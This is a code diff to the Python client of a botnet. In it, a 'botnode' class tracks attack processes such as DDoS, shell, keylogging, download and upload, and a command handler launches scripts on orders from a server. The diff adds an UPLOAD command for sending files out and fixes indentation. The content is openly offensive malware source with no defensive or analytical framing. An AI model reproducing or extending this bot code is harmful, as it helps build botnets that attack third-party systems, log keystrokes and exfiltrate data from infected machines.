@@ -35,7 +35,7 @@ class botnode:
 		#this will store all the child processes that are started (aka our attack scripts like ddos or keylogging). Might need to do something with them later
 		self.pgroup = []
 		#don't want to have multiple instances of the same program runnings to I'm using a dict to track them
-		self.cmdsrun = {'DDOS':False,'SHELL':False,'DOWNLOAD':False,'KEYLOG':False}
+		self.cmdsrun = {'DDOS':False,'SHELL':False,'DOWNLOAD':False,'KEYLOG':False,'UPLOAD':False}
 		#cmdkey is the hash of the nodes bot id
 		self.cmdkey = idhash
 
@@ -71,13 +71,13 @@ def get_cmd(value,server,bot):
 					print "Starting DDOS on {0}".format(tmp)
 					process=subprocess.Popen(tmp.split(),shell=False)
 					bot.cmdsrun['DDOS'] = True
-            if cmd == 'UPLOAD':
+			if cmd == 'UPLOAD':
 				if bot.cmdsrun['UPLOAD'] is False:
 					tmp = 'python upload.py {0}'.format(' '.join(x[1:]))
 					print "Starting upload on {0}".format(tmp)
 					process=subprocess.Popen(tmp.split(),shell=False)
 					bot.cmdsrun['UPLOAD'] = True
-            if cmd == 'DOWNLOAD':
+			if cmd == 'DOWNLOAD':
 				if bot.cmdsrun['DOWNLOAD'] is False:
 					tmp = 'python download.py {0}'.format(' '.join(x[1:]))
 					print "Starting DOWNLOAD on {0}".format(tmp)
